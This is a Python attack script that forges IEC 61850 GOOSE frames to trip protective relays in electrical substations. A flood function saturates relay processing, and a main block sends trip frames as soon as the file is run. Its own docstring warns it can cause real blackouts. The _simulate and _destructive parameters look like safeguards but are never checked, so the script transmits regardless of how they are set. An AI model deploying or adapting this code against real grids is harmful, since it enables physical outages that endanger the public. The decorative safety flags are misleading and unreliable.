"""
IEC 61850 GOOSE Spoofing Attack
Injects fake GOOSE (Generic Object-Oriented Substation Event) messages
to cause unauthorized protective relay trips in electrical substations.

CRITICAL: Can cause real-world blackouts. ONLY for authorized lab testing.
# Standard: IEC 61850-8-1 (GOOSE operates at Ethernet Layer 2, multicast)
"""
from __future__ import annotations
import logging, socket, struct, time
from dataclasses import dataclass, field

log = logging.getLogger(__name__)
GOOSE_ETHERTYPE = 0x88B8  # IEC 61850 GOOSE ethertype
GOOSE_MULTICAST = bytes.fromhex("01 0C CD 01 00 00".replace(" ",""))

@dataclass
class GOOSEResult:
    interface: str = ""; sent_count: int = 0; error: str = ""

class IEC61850GOOSEAttack:
    """
    IEC 61850 GOOSE protocol attack suite.
    GOOSE: multicast Layer-2 Ethernet frames, no authentication, no encryption.
    Used by protective relays for sub-millisecond trip signaling.
    """
    def __init__(self, interface: str = "eth0"):
        self.interface = interface

    def _build_goose_frame(self, stnum: int, sqnum: int, trip: bool = True,
                            gocb_ref: str = "GOOSE_CB") -> bytes:
        """Build a minimal GOOSE PDU (IEC 61850-8-1 ASN.1 BER encoding)."""
        # GOOSE PDU: gocbRef + timeAllowedtoLive + dataSet + goID + t + stNum + sqNum + simulation + confRev + ndsCom + numDatSetEntries + allData
        gocb_bytes = gocb_ref.encode("ascii")
        trip_byte  = b"\x83\x01\x01" if trip else b"\x83\x01\x00"
        pdu = (
            b"\x61" +  # GOOSE tag
            struct.pack("B", 50 + len(gocb_bytes)) +
            b"\x80" + struct.pack("B", len(gocb_bytes)) + gocb_bytes +
            b"\x81\x02\x00\x0a" +  # timeAllowedToLive = 10ms
            b"\x82\x08" + b"\x00" * 8 +  # t (UTC timestamp placeholder)
            b"\x85" + struct.pack("B", 4) + struct.pack(">I", stnum) +  # stNum
            b"\x86" + struct.pack("B", 4) + struct.pack(">I", sqnum) +  # sqNum
            b"\x87\x01\x00" +  # simulation = FALSE
            b"\x88\x01\x01" +  # confRev = 1
            b"\x89\x01\x00" +  # ndsCom = FALSE
            b"\x8a\x01\x01" +  # numDatSetEntries = 1
            b"\xab\x03" + trip_byte  # allData: boolean = trip
        )
        # Ethernet frame: dst(6) + src(6) + ethertype(2) + pdu
        dst = GOOSE_MULTICAST
        src = bytes.fromhex("001122334455")
        eth_header = dst + src + struct.pack(">H", GOOSE_ETHERTYPE)
        return eth_header + pdu

    def spoof_trip(self, stnum_start: int = 100, count: int = 5,
                    interval: float = 0.004,
                    _simulate: bool = True,
                    _destructive: bool = False) -> GOOSEResult:
        """
        Inject GOOSE frames with Trip=True to cause protective relay trip.
        stNum must be > last legitimate stNum seen on the network to be accepted.
        """
        result = GOOSEResult(interface=self.interface)
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((self.interface, 0))
            for i in range(count):
                frame = self._build_goose_frame(stnum_start + i, i, trip=True)
                s.send(frame)
                result.sent_count += 1
                log.info("Sent GOOSE trip frame stNum=%d sqNum=%d", stnum_start+i, i)
                time.sleep(interval)
            s.close()
        except PermissionError:
            result.error = "Root/CAP_NET_RAW required for raw socket"
        except Exception as exc:
            result.error = str(exc)
        return result

    def flood(self, duration_s: float = 5.0) -> GOOSEResult:
        """GOOSE flooding DoS — saturate relay processing with fake events."""
        result = GOOSEResult(interface=self.interface)
        end = time.time() + duration_s
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((self.interface, 0))
            stnum, sqnum = 1, 0
            while time.time() < end:
                s.send(self._build_goose_frame(stnum, sqnum))
                sqnum += 1; result.sent_count += 1
            s.close()
        except Exception as exc:
            result.error = str(exc)
        return result

if __name__ == "__main__":
    import sys
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    attack = IEC61850GOOSEAttack(iface)
    r = attack.spoof_trip()
    print(f"Sent {r.sent_count} GOOSE trip frames. Error: {r.error}")

